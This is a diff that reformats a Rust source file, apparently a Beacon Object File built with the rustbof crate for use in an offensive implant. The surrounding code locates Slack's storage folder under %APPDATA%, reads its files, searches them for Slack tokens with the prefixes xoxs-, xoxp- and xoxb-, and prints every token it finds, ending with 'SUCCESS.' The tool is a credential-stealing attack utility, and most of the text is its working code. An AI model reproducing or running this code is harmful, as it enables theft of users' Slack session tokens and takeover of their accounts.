@@ -13,17 +13,11 @@
 
 use alloc::vec;
 use rustbof::{eprintln, println};
-use windows_sys::Win32::Foundation::{
-    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, ERROR_NO_MORE_FILES,
-};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
 use windows_sys::Win32::Storage::FileSystem::*;
 
 unsafe extern "system" {
-    fn ExpandEnvironmentStringsA(
-        src: *const u8,
-        dst: *mut u8,
-        size: u32,
-    ) -> u32;
+    fn ExpandEnvironmentStringsA(src: *const u8, dst: *mut u8, size: u32) -> u32;
 }
 
 const TOKEN_PREFIXES: &[&[u8]] = &[b"xoxs-", b"xoxp-", b"xoxb-"];
@@ -52,7 +46,9 @@ fn search_tokens(data: &[u8], filename: &str) -> usize {
                 }
                 let token_len = end - start;
                 if token_len > prefix.len() {
-                    if let Ok(token) = core::str::from_utf8(&data[start..core::cmp::min(end, start + 128)]) {
+                    if let Ok(token) =
+                        core::str::from_utf8(&data[start..core::cmp::min(end, start + 128)])
+                    {
                         println!("  [{}] {} ({} bytes)", filename, token, token_len);
                         count += 1;
                     }
@@ -87,7 +83,7 @@ fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
 
         let mut size_high: u32 = 0;
         let size_low = GetFileSize(handle, &mut size_high);
-        let file_size = ((size_high as u64) << 32 | size_low as u64) as usize;
+        let file_size = (((size_high as u64) << 32) | size_low as u64) as usize;
 
         if file_size == 0 || file_size > MAX_FILE_SIZE {
             CloseHandle(handle);
@@ -121,11 +117,18 @@ fn main(_args: *mut u8, _len: usize) {
     let env_path = b"%APPDATA%\\Slack\\storage\\*\0";
     let mut expanded = [0u8; 512];
     let result = unsafe {
-        ExpandEnvironmentStringsA(env_path.as_ptr(), expanded.as_mut_ptr(), expanded.len() as u32)
+        ExpandEnvironmentStringsA(
+            env_path.as_ptr(),
+            expanded.as_mut_ptr(),
+            expanded.len() as u32,
+        )
     };
 
     if result == 0 {
-        eprintln!("Failed to expand environment string (error {:#X})", unsafe { GetLastError() });
+        eprintln!(
+            "Failed to expand environment string (error {:#X})",
+            unsafe { GetLastError() }
+        );
         return;
     }
 
@@ -173,7 +176,10 @@ fn main(_args: *mut u8, _len: usize) {
 
         FindClose(handle);
 
-        println!("Checked {} files, found {} token(s)", files_checked, total_found);
+        println!(
+            "Checked {} files, found {} token(s)",
+            files_checked, total_found
+        );
         if total_found > 0 {
             println!("SUCCESS.");
         } else {
